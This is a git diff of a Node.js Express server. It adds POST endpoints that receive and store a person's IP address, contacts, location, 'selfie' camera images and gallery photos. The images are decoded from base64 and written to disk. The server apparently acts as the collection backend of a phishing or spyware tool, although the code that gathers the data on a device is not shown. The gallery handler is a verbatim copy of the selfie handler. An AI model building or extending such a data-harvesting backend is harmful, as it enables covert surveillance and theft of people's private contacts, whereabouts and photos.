@@ -1,28 +1,19 @@
+const express = require('express');
+const cors = require('cors');
 const http = require('http');
 const fs = require('fs');
 const path = require('path');
 
-// Create a single server to handle all requests
-const server = http.createServer((req, res) => {
-  // Enable CORS
-  res.setHeader('Access-Control-Allow-Origin', '*');
-  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
-  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
+const app = express();
+app.use(cors());
 
-  if (req.method === 'POST') {
-    if (req.url === '/ip') {
-      handleIpRequest(req, res);
-    } else if (req.url === '/contacts') {
-      handleContactsRequest(req, res);
-    } else if (req.url === '/location') {
-      handleLocationRequest(req, res);
-    } else {
-      sendResponse(res, 404, 'Not found');
-    }
-  } else {
-    sendResponse(res, 405, 'Method Not Allowed');
-  }
-});
+// Define routes
+app.post('/ip', handleIpRequest);
+app.post('/contacts', handleContactsRequest);
+app.post('/location', handleLocationRequest);
+app.post('/selfie', handleSelfieRequest);
+app.post('/gallery', handleGalleryRequest);
+
 
 // Function to handle IP request
 function handleIpRequest(req, res) {
@@ -131,14 +122,100 @@ function handleLocationRequest(req, res) {
   });
 }
 
+//selfie request
+function handleSelfieRequest(req, res) {
+  let body = '';
+  req.on('data', chunk => {
+    body += chunk;
+  });
+
+  req.on('end', () => {
+    try {
+      const data = JSON.parse(body);
+      console.log('Received selfie data:', data);
+
+      const base64Data = data.image;
+      const fileName = `selfie_${Date.now()}.png`;
+      const filePath = path.join(__dirname, 'data', fileName);
+
+      // Remove metadata from base64 string
+      const base64Image = base64Data.replace(/^data:image\/png;base64,/, '');
+
+      // Convert base64 data to buffer
+      const buffer = Buffer.from(base64Image, 'base64');
+
+      // Save image to file
+      fs.writeFile(filePath, buffer, err => {
+        if (err) {
+          console.error('Error saving selfie:', err);
+          res.writeHead(500, { 'Content-Type': 'application/json' });
+          res.end(JSON.stringify({ error: 'Internal Server Error' }));
+        } else {
+          console.log('Selfie saved successfully');
+          res.writeHead(200, { 'Content-Type': 'application/json' });
+          res.end(JSON.stringify({ message: 'Selfie received and saved successfully' }));
+        }
+      });
+    } catch (error) {
+      console.error('Error parsing selfie data:', error);
+      res.writeHead(400, { 'Content-Type': 'application/json' });
+      res.end(JSON.stringify({ error: 'Bad Request' }));
+    }
+  });
+}
+
+// gallery pics
+function handleGalleryRequest(req, res) {
+  let body = '';
+  req.on('data', chunk => {
+    body += chunk;
+  });
+
+  req.on('end', () => {
+    try {
+      const data = JSON.parse(body);
+      console.log('Received selfie data:', data);
+
+      const base64Data = data.image;
+      const fileName = `selfie_${Date.now()}.png`;
+      const filePath = path.join(__dirname, 'data', fileName);
+
+      // Remove metadata from base64 string
+      const base64Image = base64Data.replace(/^data:image\/png;base64,/, '');
+
+      // Convert base64 data to buffer
+      const buffer = Buffer.from(base64Image, 'base64');
+
+      // Save image to file
+      fs.writeFile(filePath, buffer, err => {
+        if (err) {
+          console.error('Error saving selfie:', err);
+          res.writeHead(500, { 'Content-Type': 'application/json' });
+          res.end(JSON.stringify({ error: 'Internal Server Error' }));
+        } else {
+          console.log('Selfie saved successfully');
+          res.writeHead(200, { 'Content-Type': 'application/json' });
+          res.end(JSON.stringify({ message: 'Selfie received and saved successfully' }));
+        }
+      });
+    } catch (error) {
+      console.error('Error parsing selfie data:', error);
+      res.writeHead(400, { 'Content-Type': 'application/json' });
+      res.end(JSON.stringify({ error: 'Bad Request' }));
+    }
+  });
+}
+
+
+
 // Function to send response with status code and data
 function sendResponse(res, statusCode, data) {
   res.writeHead(statusCode, { 'Content-Type': 'application/json' });
   res.end(JSON.stringify(data));
 }
 
-// Start the server listening only on port 3001
+// Start the server
 const PORT = 3001;
-server.listen(PORT, () => {
+app.listen(PORT, () => {
   console.log(`Server running on port ${PORT}`);
 });
